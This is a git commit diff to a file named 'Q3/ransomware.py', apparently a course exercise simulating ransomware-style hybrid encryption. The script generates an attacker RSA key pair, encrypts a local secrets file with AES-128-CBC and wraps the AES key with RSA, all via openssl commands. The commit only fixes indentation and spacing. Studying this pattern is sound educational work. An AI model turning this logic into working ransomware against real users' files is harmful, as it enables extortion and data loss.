eeddb35eb22fbb40ee340e3589d09c08a5cd7527
Lorenzo Yanga <lorenzoyanga@gmail.com>
2025-08-13 03:38:57 +0800

    bugfix

--- Q3/ransomware.py
+++ Q3/ransomware.py
@@ -19,8 +19,8 @@ def main():
         f.write(key + "\n")
 
     # 2. Generate attacker RSA public/private keys (2048 bits)
-	run_cmd("openssl genrsa -out private.pem 2048")
-	run_cmd("openssl rsa -in private.pem -pubout -out public.pem")
+    run_cmd("openssl genrsa -out private.pem 2048")
+    run_cmd("openssl rsa -in private.pem -pubout -out public.pem")
 
     # 3. Encrypt my_secrets.txt with the symmetric key using AES-128-CBC
     # Decode base64 key to hex first so that OpenSSL can iuse it:
@@ -33,14 +33,13 @@ def main():
     # Encrypt file using openssl enc with key and iv in hex
     # Output base64 encoded cipher text to data_cipher.txt
     encrypt_cmd = (
-        f"openssl enc -aes-128-cbc -K {key_hex} -iv {iv} -in my_secrets.txt"
+        f"openssl enc -aes-128-cbc -K {key_hex} -iv {iv} -in my_secrets.txt "
         f"-base64 -out data_cipher.txt"
     )
     run_cmd(encrypt_cmd)
 
     # 4) Encrypt key.txt with the attacker's public key (RSA encryption)
     # encrypt key.txt to binary, then binary to text
-	# rsautl is deprecated but it still technically works for the time being
     run_cmd("openssl rsautl -encrypt -pubin -inkey public.pem -in key.txt -out key_cipher.bin")
     run_cmd("openssl base64 -in key_cipher.bin -out key_cipher.txt")
     # remove intermediate binary
